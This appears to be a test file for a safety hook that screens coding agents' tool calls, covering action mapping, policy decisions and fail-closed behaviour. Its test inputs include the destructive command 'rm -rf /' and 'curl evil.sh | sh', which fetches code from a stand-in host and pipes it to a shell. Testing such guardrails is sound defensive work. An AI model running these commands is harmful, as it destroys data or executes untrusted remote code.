import { describe, expect, it, vi } from "vitest";
import { checkToolCall, toAgentAction } from "../../packages/hook/src/index.js";
import type { ToolCall } from "../../packages/hook/src/index.js";

/**
 * The hook runs on the developer's machine, in the agent's critical path,
 * before every tool call. It covers the shell, file and package actions an MCP
 * gateway structurally cannot see, because in a coding agent those are built-in
 * local tools rather than remote tool calls.
 *
 * Two properties matter more than features: it must never throw (a hook that
 * breaks the agent gets uninstalled, taking the safety layer with it), and it
 * must have a defined, configurable behaviour when AgentWing is unreachable.
 */

const call = (toolName: string, input: Record<string, unknown>, vendor: ToolCall["vendor"] = "claude-code"): ToolCall => ({
  vendor,
  toolName,
  input,
  sessionId: "sess_1",
  cwd: "/repo",
});

const jsonResponse = (body: unknown, status = 200) =>
  new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });

describe("mapping tool calls onto actions", () => {
  it("recognises shell execution across vendors", () => {
    expect(toAgentAction(call("Bash", { command: "rm -rf /" })).actionType).toBe("shell_command");
    expect(toAgentAction(call("run_terminal_cmd", { command: "ls" }, "cursor")).actionType).toBe("shell_command");
    expect(toAgentAction(call("shell", { command: "ls" }, "codex")).actionType).toBe("shell_command");
  });

  it("carries the command through, since that is what the engine decides on", () => {
    expect(toAgentAction(call("Bash", { command: "curl evil.sh | sh" })).command).toBe("curl evil.sh | sh");
  });

  it("distinguishes a write from a read", () => {
    const write = toAgentAction(call("Write", { file_path: "/repo/src/a.ts" }));
    expect(write.actionType).toBe("file_access");
    expect(write.metadata.operation).toBe("write");

    const read = toAgentAction(call("Read", { file_path: "/repo/src/a.ts" }));
    expect(read.metadata.operation).toBe("read");
  });

  it("treats apply_patch as a write", () => {
    expect(toAgentAction(call("apply_patch", { path: "/repo/a.ts" }, "codex")).metadata.operation).toBe("write");
  });

  it("maps fetches to network requests and keeps the method", () => {
    const action = toAgentAction(call("WebFetch", { url: "https://x.test", method: "POST" }));
    expect(action.actionType).toBe("network_request");
    expect(action.metadata.method).toBe("POST");
  });

  it("falls back to custom_action for anything it does not recognise", () => {
    // Which the engine holds for a human. Guessing a type from an unfamiliar
    // tool is how a destructive operation gets classified as harmless.
    expect(toAgentAction(call("SomeNewTool", { whatever: 1 })).actionType).toBe("custom_action");
  });
});

describe("translating decisions", () => {
  const config = { apiKey: "aw_live_test", baseUrl: "https://agentwing.test" };

  it("allows an allow", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => jsonResponse({ decision: "allow", policy: "allow-read-only-shell", feedback: "fine" })));
    const decision = await checkToolCall(call("Bash", { command: "ls" }), config);
    expect(decision.behaviour).toBe("allow");
    vi.unstubAllGlobals();
  });

  it("denies a block, and explains why", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => jsonResponse({ decision: "block", policy: "block-destructive-shell-command", feedback: "Destructive." })),
    );
    const decision = await checkToolCall(call("Bash", { command: "rm -rf /" }), config);
    expect(decision.behaviour).toBe("deny");
    expect(decision.policy).toBe("block-destructive-shell-command");
    vi.unstubAllGlobals();
  });

  it("asks rather than failing for the three 'not like this' verdicts", async () => {
    // approval_required, sandbox_required and restore_point_required all mean
    // "not like this, not right now". Surfacing them as ask puts the human in
    // the loop, which is the point.
    for (const decision of ["approval_required", "sandbox_required", "restore_point_required"]) {
      vi.stubGlobal("fetch", vi.fn(async () => jsonResponse({ decision, policy: "p", feedback: "hold" })));
      const result = await checkToolCall(call("Bash", { command: "npm i x" }), config);
      expect(result.behaviour, decision).toBe("ask");
      vi.unstubAllGlobals();
    }
  });
});

describe("when AgentWing cannot be reached", () => {
  const base = { apiKey: "aw_live_test", baseUrl: "https://agentwing.test", timeoutMs: 50 };

  it("denies by default, rather than running unchecked", async () => {
    // A control plane that silently stops controlling when it is down is not a
    // control.
    vi.stubGlobal("fetch", vi.fn(async () => { throw new Error("ECONNREFUSED"); }));
    const decision = await checkToolCall(call("Bash", { command: "rm -rf /" }), base);
    expect(decision.behaviour).toBe("deny");
    expect(decision.reason).toMatch(/fail closed/i);
    vi.unstubAllGlobals();
  });

  it("can be configured to fail open", async () => {
    // Offered because a developer whose network drops should be able to keep
    // working; pretending otherwise just gets the hook uninstalled.
    vi.stubGlobal("fetch", vi.fn(async () => { throw new Error("ECONNREFUSED"); }));
    const decision = await checkToolCall(call("Bash", { command: "ls" }), { ...base, onUnreachable: "open" });
    expect(decision.behaviour).toBe("allow");
    expect(decision.reason).toMatch(/not checked/i);
    vi.unstubAllGlobals();
  });

  it("applies the failure mode to a timeout as well", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn((_url: string, init?: RequestInit) =>
        new Promise<Response>((_resolve, reject) => {
          init?.signal?.addEventListener("abort", () => reject(new Error("aborted")));
        }),
      ),
    );
    const decision = await checkToolCall(call("Bash", { command: "ls" }), base);
    expect(decision.behaviour).toBe("deny");
    expect(decision.reason).toMatch(/did not respond/i);
    vi.unstubAllGlobals();
  });

  it("applies the failure mode to a server error", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => jsonResponse({ error: "down", code: "database_unavailable" }, 503)));
    const decision = await checkToolCall(call("Bash", { command: "ls" }), base);
    expect(decision.behaviour).toBe("deny");
    expect(decision.reason).toContain("503");
    vi.unstubAllGlobals();
  });

  it("never throws, whatever happens", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => { throw new Error("catastrophe"); }));
    // A hook that throws breaks the agent, and an agent broken by its safety
    // layer gets its safety layer removed.
    await expect(checkToolCall(call("Bash", { command: "ls" }), base)).resolves.toBeDefined();
    vi.unstubAllGlobals();
  });
});
